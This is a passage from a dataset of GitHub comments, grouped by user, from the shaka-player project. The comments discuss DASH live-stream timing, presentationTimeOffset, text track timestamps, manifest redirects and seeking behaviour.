question:\n```ruby\nAST = 1000\nPUBLISH = 1900\nUTC_TAG = 1900\nPERIOD_START = 0\nPTO = 0\nSEGMENTS = [ \n  {SEQ: 0, DURATION: 10, T: 1880}, \n  {SEQ: 1, DURATION: 10, T: 1890}, \n  {SEQ: 2, DURATION: 10, T: 1900}\n]\nCLIENT_NOW = UTC_TAG\nSTART_PRESENTATION_TIME = CLIENT_NOW - AST # or live edge\n900\n```\n\n0) Given that the START_PRESENTATION_TIME is 900 what a dash client (shaka) does is it to search the segment list for a S@t equals to AST + START_PRESENTATION_TIME?\n1) Given that AST is 0 (in wall clock) does this mean that shaka should use the segment SEQ=2 to start playing?\n2) Once Shaka knows which Segment to start, does it drops the timing logic and follows the SEQ + 1 to deal with segment availability?\n3) If I want to reduce latency (by the cost of shorter segments and probably more rebuffers) how can I instruct a dash client (shaka) to start at my last segment ($Number)?\n4) In case of $Number templating, do we only check timing to determine the live edge? (this one I'll try to read the code too)\nSome random thoughts \nI think that we should offer or be by default less strict with timing but I know that deep inside this is mostly an MPEG dash spec \"problem\", it'd be pretty good if there was a simple MPEG dash spec for live streaming. \nI really loved what US proposed (although I thought it was on specs \u00ac\u00ac), basically a dash client should rely only on S@t to determine the availability so we could use t as PTS or other info we have in the encoder (in @timescale units) and it could be more precise than clock time.. > I will write up a doc describing this is much more detail since there has been a lot of confusion about how live works in Dash.\nFirst, sorry to make you go again and again in your explanation. It'd be very helpful to have such doc! A sample code (with controlled Presentation and Wall Clock timing) and diagrams can help.\n\nPlease ignore wall clock time since it is ONLY used to determine where we start playing. We only use it to determine where to set video.currentTime initially.\n\nRedoing my example in pseudo code:\n```ruby\n-------------------------|AST|------|NOW|->\nAST = 100 \nat AST=100 my encoder started to split segments of 10 seconds\nstarting with S[0]@t=0 then ten seconds later S[1]@t=10 and so on..\nPUBLISH = 130\nUTC_TAG = 130\nthirty seconds after I publish an (new) mpd\nPERIOD_START = 0\nPTO = 0\nit has some previous segments\nSEGMENTS = [ \n  {SEQ: 0, DURATION: 10, T: 10}, \n  {SEQ: 1, DURATION: 10, T: 20}, \n  {SEQ: 2, DURATION: 10, T: 30}\n]\nCLIENT_NOW = UTC_TAG\nSTART_PRESENTATION_TIME = CLIENT_NOW - AST\nvideo.currentTime=30\nfrom this point and beyond it'll rely mostly on S[x]@t\n``\n1) With this example, does it means that shake will play the segment (number 2 ) as the live edge?\n2) DoesTSB` change anything in here?\nIt seems to me that the AST marks the starting of the presentation timeline (t=0) and then the encoder must increase its S[x]@t each segment (S[x]@r) following the SegmentTimeline@timescale and S[x]@d.. Thank you very much @TheModMaker I think I finally understood and I'll adapt my server-side code to be compliant with Dash.\nI'll be happy to help or give feedback or read the doc you're going to do.\ncheers.. @joeyparrish thanks, this is running on my dev enviroment I'll try to find a way to expose it. \ud83d\udc4d . @joeyparrish we should keep this closed, the TV we were testing is playing regular HLS but maybe in the future we can come back to this, thank you very much! . @ismena I could not find a place where I can see all the default values for the shaka configuration. I think we can look at them by calling player.getConfiguration(); but maybe to explicitly expose those values on a documentation would be helpful.\nAnd maybe this default configuration adopted by shaka needs to be dynamically generated each shaka version, since the defaults are usually on the code itself.\n\nThe concept of network fallback as a whole?\n\nNo, I understood.. One example I can think of is how a user can intercept and act on a given error? \nShaka has its retry system but I don't want shaka to retry when my server replied with 403 or I want to extract a http header to send metrics about this error, maybe a filter where I can decide if I let the default network fallback system to work or stop the chain.. ",
    "rgc": "XMLHttpRequest does give us a way to determine where the manifest file was downloaded, but this has only been implemented in certain browsers:\nhttps://xhr.spec.whatwg.org/#the-responseurl-attribute\nI've committed a pull request here that will fix this issue:\nhttps://github.com/google/shaka-player/pull/266\n. Joey - will do!\nI'll try and get some references regarding browser support of reponseURL for you as well.\n. Closing, will resubmit under a separate branch per CONTRIB\n. Agree - replacing (this.urls[i]) is better - will do that.\n. @joeyparrish - Lint/Build passed and I've implemented the replace rather than the unshift. Will read the contrib before committing next time  ;)\nThanks!\n. Conflicts have been resolved -- Thanks\n. I think it is failing b/c the URLs are formatted in the tests as:\n//some.host.org/path/dash.mpd\nand responseUrl will typically contain the proto and params:\nhttp://some.host.org/path/dash.mpd?m=1212121\nSo the test is failing as it notices they don't match...\nI'll look into it.\n. I'm pondering the best way to fix.\nIt looks like we have an expectation that the final MPD location should match the target location:\njavascript\nspyOn(window.shaka.dash, 'MpdRequest').and.callFake(function(mpdUrl) {\n      expect(mpdUrl.toString()).toEqual(targetMpdUrl);\nI could strip the proto and params and get it to pass the specific test case, but that's not right.\nUltimately, this expectation isn't going to pass ever in cases where the player was redirected, so I'll need to come up with a better test to fit.\n. I was testing my solution last night and noticed that by replacing urls[i], we doom future manifest requests. The proper functionality would be for the relative chunks detailed in the manifest to use the 302 location for the relative baseUrl, however future manifest requests should not.\nBelow is an updated version of flow which encompasses this detail.\nExample - Proposed Flow\nhttp://some.host.org/path/manifest.mpd --> 302 --> http://other.host.org/path/manifest.mpd.\nhttp://other.host.org/path/chunk1.mp4\nhttp://other.host.org/path/chunk2.mp4\n(manifest update)\nhttp://some.host.org/path/manifest.mpd --> 302 --> http://another.host.org/path/manifest.mpd.\nhttp://another.host.org/path/chunk1.mp4\nhttp://another.host.org/path/chunk2.mp4\nI've committed a few more changes that fix the flow. I have not altered the failing test, as I believe these new changes may not trigger it.\n. @joeyparrish - squashed.\nThanks much!\n. @joeyparrish - I was able to run the tests locally, find the issue and fix it.\n. I fixed the spec tests to pass the proper number of arguments to shaka.dash.mpd.parseMpd as well\n. @joeyparrish - agreed, done and squashed.\n. Thanks for walking me through the process -- Cheers!\n. \n@ismena - I have a fix for this, which branch label should I use in my pull request?\nThanks,\nRob\n. @ismena See: https://github.com/google/shaka-player/pull/1732\nThanks,\nRob\n.  @ismena - I've added two additional tests, updated the existing SUBTITLE test, and added in a SUBTITLE exception to the code.  Thanks much for the suggestions.. \n@joeyparrish - thank you for the review!\n@ismena - can you merge when you return to the office?\nHappy 2019!\n. \nDon't mean to be a pill -- but we have a client who uses Shaka and is waiting on this merge -- do you need me to do anything else? \nThanks,\nRob\n. \nThank you @ismena for your patience and time!. I'm fixing with a different pull request, which includes the information you needed and has had lint.sh run\n. Agreed on all changes -- I've submitted updates to fix all 3 suggestions.. ",
    "lusteenh": "What about adopting the  MPD.location attribute in DASH manifests to get around this ?  In that case the server needs of course to support that too.\n. ",
    "baconz": "Sweet, thanks, Joey.\nI added us into AUTHORS and CONTRIBUTORS. CLA should be forthcoming.\n. Andrew signed it on Friday. It is associated with the philo-shaka google group, but I'm unable to \"manage\" it?\nLet me know if I need to give this another shot.\n. Ok, let me know if I should try initiating again.\n. @dougdoe be careful of #409 -- I think one of your assumptions might be broken.\n@joeyparrish it seems like any implementation of EMSG support should be inline with support for Event and EventStream, since the IOP allows you to use either one for the type of data that @dougdoe is interested in. It would be great if Shaka provided an API that allowed you to add listeners for events in the manifest that fire when the player hits the relevant position.\n. Sure! Check out 5.3.3.7 and 5.3.2.4 of the latest IOP (http://dashif.org/wp-content/uploads/2016/06/DASH-IF-IOP-v3.3.pdf). Here's the example that they give:\n<EventStream schemeIdUri=\"urn:scte:scte35:2014:xml+bin\">\n <Event timescale=\"90000\" presentationTime=\"54054000\" duration=\"5400000\" id=\"1\">\n <scte35:Signal>\n <scte35:Binary>\n /DAIAAAAAAAAAAAQAAZ/I0VniQAQAgBDVUVJQAAAAH+cAAAAAA==\n </scte35:Binary>\n </scte35:Signal>\n </Event>\n</EventStream>\nThere's also section 12.1.5 of the SCTE-67 spec, which talks about how SCTE-35 data should be integrated into DASH (http://www.scte.org/documents/pdf/standards/SCTE%2067%202014.pdf).\nThere isn't a ton of info fleshed out in the IOP, but the features that they hint at would be extremely useful to us.\n. That sounds reasonable @joeyparrish, should I open a separate issue for EventStream?\n. I think there is still an issue here.\nHere's how I understand the code:\nThe timestamp offset that is set on the engine is the offset relative to the start of the period. In other words, it is the offset required to calculate the presentation time within the period; the first segment of the period should be 0 in this world.\nThe calls to evict and subsequently to remove, use time relative to the availability start time, which has an entirely different time scale. Since the cue/buffer times are relative to the period, bad things seem to happen on the evict calls.\nI think this patch fixes an issue whereby single-period playback won't start until all text fragments have been buffered, but multi-period playback is still broken if there is a text track.\nUpdate I looked at this again, and I stand corrected:\nThe issue is that the startTime and endTime passed to appendBuffer are relative to the start of the period (pto), while everything else is relative to the availability start time via timestampOffset\nOne solution would be to pass the periodStart all the way through streaming_engine to text_engine and adjust the buffer start/end accordingly. I'm guessing that's more tight-coupling than you guys would be comfortable with. Other ideas?\n. Sorry, the PR is misleading, I'm not suggesting we remove the offset, just that the offset be relative to the AST, as opposed to the period start.\nHere's a sample manifest. I can make playback available if you want to get in touch with me out of band.\nmanifest.txt\n. Let me try to be explicit about what I believe that I'm seeing in the text flow. I'm glossing over many parts of the system, but this is how I understand it:\n1. References are created in SegmentList.parseSegmentListInfo_ and have the PTO applied to their start and end times. Now all the references have times relative to the period start, not the AST.\n2. StreamingEngine decides the references need to be buffered, and we end up in fetchAndAppend, which calls initSourceBuffer on the current period\n3. We set the timestampOffset on the media source to period start - PTO. The timestampOffset is relative to the AST. Please correct me if I'm wrong about this assumption.\n4. Once we fetch the segments they get passed through to StreamingEngine.append_, which calls StreamingEngine.appendBuffer_ using the start and end times of the references. Per my assumption above, these times are period relative.\n5. Now we arrive at TextEngine.appendBuffer, which is adding the offset to the the reference start/end times. As I see it, the math we are doing is: \nreferenceTime = origTs - PTO\noffset = periodStart - PTO\nnewReferenceTime = referenceTime + offset\nwhere referenceTime is startTime or endTime in TextEngine.appendBuffer. This can be rewritten as\nnewReferenceTime = origTs - PTO + periodStart - PTO\nSo we're subtracting out the PTO twice. I think what we actually want is:\nnewReferenceTime = origTs - PTO + periodStart\nI think the right solution is to pass the periodStart into TextEngine so that we can add it to the reference times that we pass in to appendBuffer.\nI'm happy to move this off to an issue, if you think it is legit.\n. I agree that we should be adjusting the timestamps of the media passed to TextEngine.appendBuffer by timeStampOffset. That part of the code is behaving correctly (https://github.com/google/shaka-player/pull/411/files#diff-564eace42ce079927d4fbedc838cf4aeR129).\nThe issue is that we are using the reference start/end time (which are not passed to a normal MediaSource) to adjust bufferStart_ and bufferEnd_ (https://github.com/google/shaka-player/pull/411/files#diff-564eace42ce079927d4fbedc838cf4aeL123). This happens automagically inside of MediaSource, but we need to do it manually for TextEngine. My point is that those start and end times are getting the PTOs applied twice.\nSorry this is dragging out. I don't have a great way to make that content to you available publicly, but we might be able to make something work out of band...\n. I passed periodStartall the way through to TextEngine. I think an alternative would be to add periodStart to the reference object, and create methods to calculate the AST-relative start and end times, but that seemed like a bigger change, so I figured best to start here.\nLet me know what you think.\n. Sounds good. Let me know if you need anything else from me.\n. \ud83d\udc4d It works! Thanks, Joey!\n. Ah, I missed 7aab332e9bea92cd5bf811e558ab531b2c3b190f.\nIt seems like there would still be an issue for in-progress recordings. We would want the user to be able to scrub to the end of the presentation once those segments become available. So a slight modification of my code above:\n```\n  var distanceFromEnd = this.duration_ - this.getSegmentAvailabilityEnd();\nvar delay;\n  if (this.duration_ == Number.POSITIVE_INFINITY ||  distanceFromEnd > this.presentationDelay_) {\n    // Normal live playback or an IPR that is not at its end, don't let the user scrub past the buffer\n    delay = this.presentationDelay_\n  } else {\n    // This is VOD or the end of an in progress recording.\n    // delay will always be 0 for VOD, and it will \n    delay = distanceFromEnd;\n  }\n```\n. Wanted to bump this up. I'm happy to put it into a PR if that is helpful.\nTo sum up: Now that suggestedPresentationDelay is being applied correctly as a delay to seekEnd() we will never allow users to scrub to the end of in progress recordings.\n. @tdrews I took another stab. Adding isLive to context seemed a little cleaner than passing segmentAvailabilityDuration all the way through. Let me know if you disagree, and I can change it.\n@joeyparrish My author info is the same as my previous commits. Is it possible I fell out of the system somewhere along the way?\n. I signed it!\n. Cool! Just added it @joeyparrish let me know if things check out now.\n. Sorry about that, let me try to clarify.\nThe desired behavior for an in-progress VOD is:\n- availability end is the live edge\n- duration set on the video element is the full duraiton of the asset\n- the asset is scrubbable back to its start\nOur in-progress VOD has the following attributes:\n- type=dynamic because we want to keep fetching new segments as they're available\n- mediaPresentationDuraiton=PT10920S because we want the scrubber to behave as a VOD asset, and show the full duration\n- timeShiftBufferDepth=PT10920S because in the presence of mediaPresentationDuration, this is the only way to convince PresentationTimeline that the content should be treated as live, and thus the liveEdge() should be used as segmentAvailabilityEnd\nGiven all of that, with the current behavior, the beginning of our assets are not scrubbable because reposition_ treats them as live, and so safe ends up as 0 + 1 + this.rebufferingGoal_. This patch provides a fix for that issue since the asset will have finite duration.\nI think a cleaner fix might be to look at type in isLive() so that we don't have to set timeShiftBufferDepth? Thoughts?\n. Looking at test failures...\n. I still get a failure on text_engine tests, but this looks unrelated:\nChrome 52.0.2743 (Mac OS X 10.10.5) TextEngine appendBuffer adds cues to the track FAILED\n    Expected spy mockParser to have been called with [ [object ArrayBuffer] ] but actual calls were [ [object ArrayBuffer], 0, 3 ].\n        at /Users/seth/projects/shaka-player/test/media/text_engine_unit.js:67:28\n    Expected spy mockParser to have been called with [ [object ArrayBuffer] ] but actual calls were [ [object ArrayBuffer], 3, 5 ].\n        at /Users/seth/projects/shaka-player/test/media/text_engine_unit.js:79:28\nI think these tests need to be updated after 8b767df6a147fce027d3d61093b3926a781a11cd\n. @joeyparrish tests pass for me locally with your fix.\n. @joeyparrish is this on your roadmap for the near/medium term? If not, we can take a stab at it.. @joeyparrish we have not started on it yet. If you could schedule it that would be great.. Sorry about that! Looking\n. Looks like this manifest has no MPD, but is static. I didn't realize that was allowed.\nThoughts on keying off of type to determine whether a manifest isLive? It seems like that's the best possible indicator.\n. Got it. Thoughts on using type for this?\n. Yep, exactly. Here's a summary of how it is set up right now: https://github.com/google/shaka-player/pull/442#issuecomment-232222000\nI can update with a sample mpd in a bit.\n. I think that there are three questions which at one point or another have been associated with \"isLive\":\n1. Is there a known duration?\n2. Are all of the segments currently available? What is the availability end?\n3. Is the back-buffer dynamic? What is the segment availability duration?\nIn my view, \"isLive\" should always refer to (2) on that list, and I don't think there are any places in the code where we're conflating it with the others (anymore?). As far as I can tell, the best proxy we're going to get for (2) from the manifest is type=dynamic, so I think this PR is still valid.\nThe reason some of this logic needed to be pulled out of the PresentationTimeline was that we need it when populating the SegmentIndex, before the timeline is fully initialized. It probably makes sense to add an instance variable to PresentationTimeline that is taken directly from context.isLive and use that in PresentationTimeline.isLive to avoid any confusion.\nRight now we signal (1) and (3) with timeline.getDuration() == Number.POSITIVE_INFINITY and timeline.getSegmentAvailabilityDuration() == Number.POSITIVE_INFINITY respectively. We could throw those into their own methods on timeline for clarity.\nLet me know your thoughts, and I can submit a revised PR.\n. Thanks @joeyparrish. I was playing around with some video that had small gaps due to the PTS/DTS bug, and the behavior seemed unexpected. Given that some browsers can recover from small gaps, doesn't it seem like the player should acknowledge media that's buffered past a gap?\nIs there an enhancement to be had here? I guess this is related to #180.\n. Yeah, this popped up when I seeked to a point just before the start of a period that introduced a gap.\nThe player would enter a buffering state, and it would never recover because it thought that it had nothing buffered ahead. Worse yet, it would try to buffer the same segments over and over again, which ultimately led to a QUOTA_EXCEEDED_ERROR. @joeyparrish can you think of a way to protect against this? It seems reasonable that somebody might accidentally introduce a gap, and the player shouldn't react by attacking your CDN with segment requests.\nDo you see a problem with Shaka behaving optimistically and assuming that the browser will play through the gap? It seems like it should honor GAP_OVERLAP_TOLERANCE and treat buffered ranges with gaps smaller than that value as continuous.\n. This looks great @joeyparrish. Thanks.\nWouldn't there still be a problem with getting into fetch-loops? Should a gap larger than GAP_TOLERANCE throw an error?\n. Sweet, sounds good.\n. @joeyparrish lgtm. It works with our content.\nThe demo player is a bit messed up, though. I think it should either only let you seek to seekRange.end or we should introduce a differentiation between the scrubbable range and the width. Right now it will let you seek into an unbufferable range.\n. Yep, sounds perfect.\n. Yes, looks good.\nOne more small issue: I think IPRs should take the presentationDelay into account when calculating the seekRangeEnd.\n. Sweet, thanks.\n. We built our VTT packager to conform with Shaka's period-relative timestamps. We can change them since it seems like everybody is switching to segment-relative timestamps.\n. @joeyparrish Any chance of adding a legacy flag to soften the transition for us? I can try to put up the PR, but probably won't get to it this week.\n. I do not think there is clarity on whether the cues should be relative or absolute for live playback. Can we put this behind a config parameter so we don't break backwards compatibility for those of us who have already hacked around this :)\nSee:\nhttps://github.com/google/ExoPlayer/issues/1493\nhttps://github.com/Dash-Industry-Forum/Test-Vectors/issues/44\n. @joeyparrish I think my last patch addresses all of those issues. Let me know what you think!\n. @PatrikCarlander our multi-period live manifests use SegmentTemplate and work with the latest Shaka.\nWhat we have seen is that if the period start time is not precise enough (rounding issues), you can run into problems like the one you describe.\nI think (@ismena correct me if I'm wrong) reference should always be in needPeriod, but this might not hold if your period start times do not match your period durations as calculated by Shaka. As a side note, I think there might be a missing assertion here.\nCan you see from the logs whether reference.endTime + period.startTime > nextPeriod.startTime?\n. Sorry about that, I misunderstood -- we use SegmentTemplate + SegmentTimeline with period start times. This manifest uses SegmentTemplates with period durations, and looks like a different issue. Sorry for the confusion!\n. @joeyparrish there's one more option that we discussed, which would be to leave out the empty period, but apply an adjustment to the live head, pulling it back by a duration equivalent to the gap length. This method is not yet supported in the spec, but I think that barring a true server-side solution (ie filling the gaps with a \"slate\"), it might be the simplest fix.\nI'm happy to submit a ticket to the IOP if others think that this would be helpful.\n. @sanbornhnewyyz Do you know the duration of the event ahead of time, or do you need to signal it after  the start? If you know the duration ahead, you can use in-progress-recordings (IPRs), which you signal by creating a dynamic manifest with a mediaPresentationDuration, and no timeShiftBufferDepth.\n. I recognize that this is what the spec says, and we should honor it, but it is a huge pain! It means that the packager needs to be aware of ad breaks, blackouts, and key rotation so that it can set period relative timestamps on text tracks. This feels like unnecessary complexity!\nDoes anybody else agree that this is an undue burden? I will create an issue with the IOP...\n. @sandersaares, so then the IOP really shouldn't have a stance on what the timeline of sidecar files should be, right? This runs contradictory to @sanbornhnewyyz's quote above.. Sure, I'm all for providing guidance on divergent implementations. With that said, I maintain that it creates undue burden on the packager to require that plaintext sidecar files provide period-relative timestamps. @sandersaares do you think the IF would consider revising this requirement?. I can set up a test stream on our infrastructure, but it won't be super reliable (the only non-DRMed content we have runs off my desk via Chromebit -> VIDIU -> transcoder in our garage). This would probably suffice for demonstration purposes, but not for long term integration testing.\nIf you have a live RTMP or HLS feed that you have the rights to, we can ingest it through our pipeline and make it available for testing this -- I'll just add some code that drops a few segments every here and there.. Your point about \"bad\" manifests generators unknowingly changing the AST is well taken. What if we put it behind a configuration flag so that users need to explicitly allow the AST to change?\nI don't think gap jumping solves this. The problem shows up as a seekRange() that includes time at the end that will never be playable. It means that the user could scrub to a region that will always result in buffering.\nI think the only other solution is to fill in the lost time with black frames inside of a period, but that seems like more work to implement.. Got it. That would solve this problem!. Ah, sorry -- I should have been more specific.\nFor live playback the code calculates a safe starting point by taking the earliest start, adding 1 second and the rebuffering goal. Assuming that safe region is inside the available window, it will add another 2 seconds to the targetTime.\nImagine a live manifest where the timeShiftBufferDepth is greater than or equal to the duration of the segments that are presented -- that is, the buffer is expanding, and not rolling. In this case, the first period starts at 0, and all of its segments are always available for playback, so getEarliestStart() returns 0. If the minBufferTime is set to 8, given the calculation above, the earliest that the user will be able to scrub to is 11 (8 + 2 + 1) -- this doesn't seem right to me, since those first 11 seconds are available and playable.\nMy questions are:\n\nWhy add 1 and 2 to the safe buffer region? \nWhy add the rebufferingGoal to the safe region?\n\nIt seems to me that rolling, or not, the beginning of the buffer (getEarliestStart()) should always be available on the server (ideally with some padding managed by the server), and that this calculation is superfluous.\n. Understood. I feel this conversation really comes down to getting a precise definition of timeShiftBufferDepth. My feeling is that liveEdge - TSB should represent the earliest possible time for which a segment request can start. If a segment falls outside of the TSB while a request for that segment is in progress, the server should not delete the segment.\nOn a more practical level, I guess I'm saying that the server should be responsible for making sure segments remain available for rebufferingGoal or at least segmentDuration after they expire. This does not feel like it should be the client's responsibility.. Ok, I get where you're coming from here.\nIn the case where there is no duration (so this is not an IPR), but the back buffer is not (yet) rolling. It seems like we need to let the user scrub to the beginning in this case. What about adding a check to see if the overall availableDuration is less then the TSBD by more than the rebufferingGoal -- if that check passes, maybe we could just set safe = earliestStartTime?. Sounds good @joeyparrish. Let me know if/when you'd like to discuss this further.. Hey Joey, I'm out this week, but will take a look next Monday when I'm\nback.\nOn Mon, Apr 24, 2017, 16:15 Joey Parrish notifications@github.com wrote:\n\n@baconz https://github.com/baconz, we recently landed gap jumping in\n555 https://github.com/google/shaka-player/issues/555. Is this PR\nstill applicable? Or does gap jumping solve the same problem this PR is\nmeant to solve?\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub\nhttps://github.com/google/shaka-player/pull/731#issuecomment-296872206,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/ABElxlPt66zzIIjp6j8h1qD8z_hkHncRks5rzVdGgaJpZM4Mkobw\n.\n. @joeyparrish unfortunately #555 doesn't solve the whole picture for us. There are two problems:\n\n(1) Chrome sees negative start times because we use PTS as the the PTO, and Chrome uses the DTS as the timestamp of the first sample.\n(2) Chrome sees gaps because Chrome sees periods as shorter than they should be.\n555 solves (2), but not (1).\nWith (1) Shaka will throw a 3016 and you'll get an error along these lines in media-internals:\nvideo frame with PTS 0us has negative DTS -66734us after applying timestampOffset, handling any discontinuity, and filtering against append window\nHere's a diagram that represents the problem for a single segment:\n```\n   PTO\n   PTS\n   6006\n      |\n|\n 0\nDTS\n```\nHere the PTO would be set to 6006, and Chrome would see the first timestamp as -6006.\nThis PR allows you to mitigate this problem by adjusting the PTO based on the maximum number of concurrent b frames in the underlying content.. I agree that it is a lot of code to work around this bug, but given that the bug has been open 3 years, we're not holding out hope that it will be fixed. To us it seemed cleaner to push the workaround as close as possible to the client instead of branching off somewhere further up the video pipeline.\nWe make the decision on whether or not to enable the flag when we call player.configure() based on out-of-band browser information (I think we use bowser).\nIf we really wanted to be fancy, we could embed a very simple fragment with a single frame and a known PTS. When we initialize the player, we could pass it to a test SourceBuffer and read back the buffered range to find out if the browser has this bug.\nIf we wanted to be really fancy, I think we could detect the number of consecutive b-frames by using the num_ref_frames parameter in the SPS, but that would require parsing the init.mp4 and parsing the SPS, which seems like a lot of code.\n. @joeyparrish sounds good, it would be awesome if they push a fix!. Fixed. Sorry about that.\n. ",
    "DanielBaulig": "Thanks for the great feedback! \nBuffering and pausing are not only separate concept from the users perspective but also from a product perspective. Let's say I want to temporarily pause the video under certain circumstances, e.g. when the window looses focus. If the user switches into a different tab while the video is buffering the call to pause will not have any effect and the video will resume playback in the background once it's done buffering.\nI've currently solved the problem by adding a small setResumeAfterBuffering method to Shaka player that set's a flag that is then checked to make the play() call at the end of the buffering state conditional.\nI call this from the 'bufferingStart' event handler and set it to true from there. Then, whenever I call play or pause I also make sure to set this value correctly, so that once the video is done buffering it will do the correct thing.\n. @joeyparrish CEA-608/CEA-708 is usually embedded as SEI messages among the video samples. I assume that is what he means.. I increased timeShiftBufferDepth and now it plays, thanks! Can you elaborate a little what these errors mean?\nE.g. is currentPresentationTime and latestAvailableSegmentEndTime on the same timeline? Does that mean these values are more than 530 seconds apart form each other even though they should overlap? What could cause that?\nSetting different values from timeShiftBufferDepth seems to affect the delay between live head and play head. What's a good approach to minimize this delay?\n. Thanks a lot for the great feedback! \nJust so that I understand correctly:\nThe nginx module drops segments from the timeline as playback progresses and shifts availability start and end time accordingly. So e.g. early in playback it could have an MPD@availabilityStartTime of 06:33:12 and a MPD@availabilityEndTime of 06:33:37 with 5 segments starting at t=0 and a duration of 5 seconds each.\nAfter 20 seconds have passed there will still be 5 segments but now beginning at t=20 and availabilityStartTime and availabilityEndTime will both have shifted by 20 seconds forward.\nDo I understand you correctly that in such a case the SegmentTemplate@presentationTimeOffset should be 20s? Or am I misreading your explanation?\nEDIT: Note that during playback of the given manifest that currentPresentationTime never actually moves away from around the 11 - 12 second mark. Is that due to the missing presentationTimeOffset?\n. I think the primary concern is to blow up manifest size for very long streams with very small segment durations. \nI would be interested in applying these changes in v1. That said, I don't think the nginx module does the changers to @presentationTimeOffset or @startNumber correctly. Also not sure what section 4.4.3.3 is referencing when it talks about \"S values\" (S elements in the SegmentTimeline?) or how they need updating.\n. Yes, adjusting timeShiftBufferDepth by setting it to a reasonable value (e.g. 10 seconds) or completely removing it, fixed the playback issues.\nSo dropping segment elements from the SegmentTimeline is possible, while keeping availabilityStartTime at it's original value? I changed the RTMP module to do that, and it looks like this fixed the warning messages too.\n. Hi Joey. I am working with Lucas on this and will send you an email with some more details. Thanks!\n. ",
    "mephillips423": "What do you mean by chrome does allow seeking while paused. I have \nvideos with the timecodes burnt in.\nI get the same behavior from firefox, chrome and IE. I can set the \ncurrentTime, but the video frame displayed with\nthe burnt in timecode never matches. I am assuming I have the correct \nvideo buffered available, because all I\ndo is pause the video, after is stops I attempt to add one frame to the \ncurrentTime attribute, but like I\nsaid the video displayed seldom moves as I add more time to currentTime.\nOn 11/23/2015 5:01 PM, Joey Parrish wrote:\n\nHi @mephillips423 https://github.com/mephillips423,\nI don't believe the player can do anything to influence this. \nFrame-accurate seeking depends on the browser and the video encoding.\nFor example, if every frame were a key frame, then I have no doubt \nevery frame would be directly seekable in every MSE-capable browser. \nThis would be a terrible idea, though, since it would ruin compression \nand therefore quality.\nSeeking to non-keyframes is something a browser would have to support \nby seeking first to the previous keyframe, then decoding subsequent \nnon-keyframes until the target frame has been decoded. It is entirely \npossible that browsers may choose to avoid this when the video is \npaused. I don't know for sure.\nI would bet that the reason you get frames displayed every 20-40 \nframes is that your content's keyframe interval is between 20 and 40.\nYour application seeks directly on the video element by setting \ncurrentTime. The only time the player gets involved when you seek is \nif this time has not been buffered yet. In that case, we would have to \nfetch the appropriate segments and feed them to the browser.\nI would suggest that you make sure the range in which you want to \nframe-accurately seek is actually buffered. |html5VidElem.buffered| is \nwhere you would get this information.\nIf the content is buffered, and seeking while paused still does not \ndisplay frames, then it is a browser implementation issue. In this \ncase, I would advise you to file a feature request with your browser \nvendor to support frame-by-frame display while paused.\nI just did a quick check with the \"car\" video from our demo app, and \nChrome does allow seeking while paused with |video.currentTime += \n1/23.97|. It appears to do interesting things with b-frames or maybe \nwith PTS/DTS differences, but that is another matter.\n\u2014\nReply to this email directly or view it on GitHub \nhttps://github.com/google/shaka-player/issues/234#issuecomment-159118036.\n. This URL: \nhttp://shaka-player-demo.appspot.com/assets/car_cenc-20120827-manifest.mpd\nhad some digital rights issues in my test setup\n\nHtml5VideoPlayer.html:33 CustomEvent {isTrusted: false, srcElement: \nnull, currentTarget: V, target: V}(anonymous function) @ \nHtml5VideoPlayer.html:33yb @ shaka-player.compiled.js:40H.dispatchEvent \n@ shaka-player.compiled.js:39(anonymous function) @ \nshaka-player.compiled.js:173\nshaka-player.compiled.js:155 Uncaught (in promise) Error: No DrmInfo \nexists!(\u2026)\nI went to the following URL: http://shaka-player-demo.appspot.com/\nand found an alternate URL:\nhttp://shaka-player-demo.appspot.com/assets/car-20120827-manifest.mpd\nYaay!  This seems to display different frames as I request them.\nThis is on chrome 46 windows 7.1\nWe are using wowza 4.3 as the stream server. Do think it could be the \nserver, or do I need  encode our h264 mp4 video with\na particular codec.\n. Thanks for your help!\nIs there a forum that you know of that might have a knowledge base about \nthe issues I am having.\nOn 11/24/2015 11:54 AM, Joey Parrish wrote:\n\nI'm sorry, we are not affiliated with Wowza. If you need help with \nyour Wowza stream server, you should contact Wowza support \nhttps://www.wowza.com/support.\nSince we've determined that your use-case works in Shaka Player \nrunning on Chrome, I'm going to close this issue now. Thanks for using \nShaka, and please feel free to open a new issue if you have any \nShaka-related problems.\n\u2014\nReply to this email directly or view it on GitHub \nhttps://github.com/google/shaka-player/issues/234#issuecomment-159387224.\n. Thanks, I posted it there, no one has a reply.\n\nOn 11/24/2015 12:09 PM, Joey Parrish wrote:\n\nHave you tried Wowza? http://www.wowza.com/forums/forum.php\n\u2014\nReply to this email directly or view it on GitHub \nhttps://github.com/google/shaka-player/issues/234#issuecomment-159390742.\n. Thanks for responding. You are always so responsive and helpful.\n\nDo you think it is & in the Title>rat/streamcache/11/19/2018/0328/172711430/WithAmp&.avproxy.mp4?\nHere is the manifest URI and what is returned, it is not publicly accessible.  Putting this XML in a validator shows an error for the & in the Title element\nhttps://centos1:1937/vod/x/rat/streamcache/11/19/2018/0328/172711430/WithAmp%26.avproxy.mp4/manifest.mpd\nManifest.mpd.txt\n. I agree the problem is with the manifest. Correct to close bug. We have filed a bug with the stream server software.. ",
    "edouardbe": "@joeyparrish,  Thanks, I will probably customize locally and look forward to the 2.0 too.\nRegards\nE.\n. Thanks @joeyparrish \nI'm using the current JWplayer 7.3.0-beta.1 which integrates the shaka player in version 1.6.1 and I see a difference with my previous tests : \nbefore : the =date was written after the last queryString parameter\nnow : the =date is written before the last queryString parameter\nbut the problem can not be resolve like that. It was better to let the =date at the end of the querystring and let us managing with our CDNs how to ignore all the parameters after the security token (our last query string parameter).\nBy the way, our CDNs did it for us, they now ignore the =date when after our token.\nIf the _=date is written before the token, it's worst.\nI get the same error with the shaka version 1.5.1 embedded in JWPlayer 7.2.4\nAbout the version 1.6.2, I hope the _=date will be back at the end of the querystring.\nBest Regards,\nEdouard\n. Hi Joey,\nYes, it's a duplicate. Thanks for your attention.\nRegards,\nEdouard\n. ",
